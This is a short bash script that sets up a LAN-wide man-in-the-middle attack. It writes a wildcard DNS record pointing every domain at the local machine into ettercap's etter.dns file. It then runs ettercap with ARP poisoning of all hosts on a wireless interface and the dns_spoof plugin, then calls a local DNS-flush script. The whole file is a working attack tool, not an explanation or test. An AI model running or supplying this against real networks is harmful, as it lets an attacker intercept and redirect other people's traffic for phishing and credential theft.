#!/bin/bash
#ip=$(sudo ifconfig | grep "inet addr:" | cut -d':' -f2 | cut -d' ' -f1 | grep -v "127.0.0.1")
ip=`hostname -I`
if [[ -n $1 ]]; then ip="$1"; fi
sudo sh -c "echo \"* A $ip\" > /etc/ettercap/etter.dns" && echo -e "\nWrote \"* A $ip\"\n" #|| echo -e "\nUnable to write into /etc/ettercap/etter.dns!\n"
sleep 1
sudo ettercap -T -q -i wlp2s0 -P dns_spoof -M arp /// ///
/home/eddy/programming/bash/flushdns.sh
